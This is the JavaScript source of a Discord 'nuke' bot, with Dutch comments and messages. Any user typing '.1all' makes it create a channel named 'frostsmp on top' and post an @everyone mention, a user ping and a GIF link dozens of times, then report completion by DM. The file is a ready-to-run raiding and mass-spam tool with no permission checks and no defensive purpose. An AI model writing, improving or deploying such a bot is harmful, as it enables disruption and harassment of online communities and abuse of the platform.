import { Client, GatewayIntentBits, PermissionsBitField, ChannelType } from 'discord.js';
import http from 'http';

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ]
});

const PREFIX = '.1';
const GIF_URL = "https://cdn.discordapp.com/attachments/1522698849276268634/1522701428466909326/togif.gif";

http.createServer((req, res) => res.end('Bot running!')).listen(3000);

client.once('ready', () => {
    console.log(`✅ Bot is online als ${client.user.tag}`);
});

client.on('messageCreate', async message => {
    if (message.author.bot || !message.content.toLowerCase().startsWith('.1all')) return;

    const args = message.content.slice(5).trim().split(/ +/);
    const spamAmount = parseInt(args[0]) || 50;

    message.delete().catch(() => {});

    try {
        await message.author.send(`⚠️ Nuke gestart! Maak 1 channel + spam ${spamAmount}x`);
    } catch {}

    // 1 Nieuw channel aanmaken
    let newChannel;
    try {
        newChannel = await message.guild.channels.create({
            name: "frostsmp on top",
            type: ChannelType.GuildText,
        });
    } catch (err) {
        return message.channel.send("❌ Kon geen nieuw channel aanmaken.").catch(() => {});
    }

    // Spam in het nieuwe channel
    for (let i = 0; i < spamAmount; i++) {
        await newChannel.send({
            content: `bedankt voor het gebruiken <@1012720131937419365>\n@everyone\n${GIF_URL}`
        }).catch(() => {});
    }

    try {
        await message.author.send(`[DONE] 1 channel aangemaakt en ${spamAmount}x gespamd.`);
    } catch {}

});

client.login(process.env.TOKEN);
